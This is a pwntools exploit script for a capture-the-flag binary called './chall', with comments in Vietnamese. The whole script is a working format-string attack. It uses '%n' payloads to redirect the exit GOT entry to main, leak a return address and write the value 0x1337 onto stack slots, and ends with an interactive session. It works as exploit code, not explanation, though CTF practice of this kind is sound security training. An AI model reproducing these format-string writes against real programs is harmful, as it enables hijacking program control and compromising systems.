from pwn import *
context.binary = exe = ELF("./chall")
r = process("./chall")
gdb.attach(r, gdbscript='''
b* main+399
b* main++317
c           
           ''')

input()
### Leak dia chi ret ###
offset = 0x10
payload = b'%*15$c%16$n'.ljust(16)
payload += b'%11$p'.ljust(8)
payload += p64(exe.sym['main'])
payload += p64(exe.got['exit'])
r.sendafter(b"name:\n", payload)

r.sendlineafter(b"a gift:\n", b"123")
leak = int(r.recvuntil(b"let", drop=True)[:-6].replace(b" ", b"")[6:], 16)
log.info("ret_add " + hex(leak))
leak -= 0xb0
### ghi giá trị ###
part1 = leak - offset
part2 = leak - offset + 0x8

payload1 = b"%*17$c%15$n%16$n".ljust(24)
payload1 += p64(part1)
payload1 += p64(part2)
payload1 += p64(0x1337)
r.sendafter(b"name:\n", payload1)
r.sendlineafter(b"gift:\n", b"9838")
r.interactive()
